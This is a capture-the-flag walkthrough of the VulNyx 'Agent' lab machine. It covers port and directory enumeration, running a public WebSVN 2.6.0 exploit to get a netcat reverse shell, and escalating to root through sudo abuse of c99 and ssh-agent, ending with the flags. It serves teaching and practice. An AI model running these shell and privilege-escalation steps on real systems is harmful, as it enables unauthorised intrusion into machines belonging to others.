# VulNyx - Agent

## Information

## Solution
### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sCV -p- -T4 192.168.11.16
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 15:04 +07
Nmap scan report for 192.168.11.16
Host is up (0.00065s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.22.1
MAC Address: 08:00:27:C0:88:A0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.93 seconds
```
#### Gobuster
When we try to fuzz, the server blocks me.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://192.168.11.16/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.11.16/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 0 / 1 (0.00%)
2026/05/06 15:08:35 the server returns a status code that matches the provided options for non existing urls. http://192.168.11.16/b1617530-4141-4656-b526-f7c069c51d89 => 403 (Length: 153). Please exclude the response length or the status code or set the wildcard option.. To continue please exclude the status code or the length
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://192.168.11.16/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --random-agent
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.11.16/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              Opera/9.25 (Windows NT 6.0; U; en-US)
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 615]
/websvn               (Status: 301) [Size: 169] [--> http://192.168.11.16/websvn/]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```
In the `/websvn` path, we find a WebSVN and in the footer we see WebSVN version 2.6.0
![websvn](/walkthroughs/vulnyx/low-difficulty/19_agent/websvn.png)
Searching online we found the following [exploit](https://www.exploit-db.com/exploits/50042) that affects that version.

### Shell

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ python3 exploit.py "http://192.168.11.16/websvn"

```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.11.10] from (UNKNOWN) [192.168.11.16] 56012
bash: cannot set terminal process group (353): Inappropriate ioctl for device
bash: no job control in this shell
www-data@agent:~/html/websvn$ id ; hostname
id ; hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
agent
```
#### Shell (dustin)
```bash
www-data@agent:~/html/websvn$ sudo -l
sudo -l
Matching Defaults entries for www-data on agent:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on agent:
    (dustin) NOPASSWD: /usr/bin/c99
```
![c99 shell](/walkthroughs/vulnyx/low-difficulty/19_agent/c99-shell.png)
```bash
www-data@agent:~/html/websvn$ sudo -u dustin /usr/bin/c99 -wrapper /bin/sh,-s x
<$ sudo -u dustin /usr/bin/c99 -wrapper /bin/sh,-s x
id
uid=1000(dustin) gid=1000(dustin) groups=1000(dustin)
hostname
agent
bash -i
bash: cannot set terminal process group (353): Inappropriate ioctl for device
bash: no job control in this shell
dustin@agent:/var/www/html/websvn$ 
```
### Privilege Escalation
#### Enumeration
```bash
dustin@agent:/var/www/html/websvn$ sudo -l
sudo -l
Matching Defaults entries for dustin on agent:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dustin may run the following commands on agent:
    (root) NOPASSWD: /usr/bin/ssh-agent
```

#### Abuse
![ssh-agent shell](/walkthroughs/vulnyx/low-difficulty/19_agent/sshagent-shell.png)

```bash
dustin@agent:/var/www/html/websvn$ sudo -u root /usr/bin/ssh-agent /bin/sh
sudo -u root /usr/bin/ssh-agent /bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
hostname
agent
```

#### Flags
```bash
find / -name root.txt -o -name user.txt | xargs cat
51ff843faf1bc11c162e973cf852ffae
d31788f2e636e115b417e0a61c6b69e0
```

***You are welcome!***
